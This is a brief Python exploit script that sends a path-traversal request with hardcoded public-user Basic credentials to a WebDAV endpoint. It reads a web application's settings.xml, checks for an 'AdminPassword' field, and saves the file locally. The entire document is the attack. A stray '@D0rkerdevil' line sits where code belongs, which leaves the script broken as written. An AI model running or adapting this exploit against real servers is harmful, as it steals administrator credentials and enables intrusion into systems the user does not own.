#!/usr/bin/python3
# -*- coding: utf-8 -*-
import requests
import sys
from requests.packages import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
@D0rkerdevil
target = sys.argv[1]

url = target \
    + '/dav/server.php/files/personal/%2e%2e/%2e%2e//%2e%2e//%2e%2e/data/settings/settings.xml'
Base_Headers = {
    'Authorization': 'Basic Y2FsZGF2X3B1YmxpY191c2VyQGxvY2FsaG9zdDpjYWxkYXZfcHVibGljX3VzZXI=',
    'User-Agent': 'It doesnt matter',
    'Accept': '*/*',
    'Connection': 'close',
    }
req = requests.get(url, headers=Base_Headers, verify=False)
if 'AdminPassword' in str(req.content):
    print(req.content)
    with open('settings.xml', 'w') as f:
        f.write(str(req.content))
else:
    print ('not vulnerable!!!')
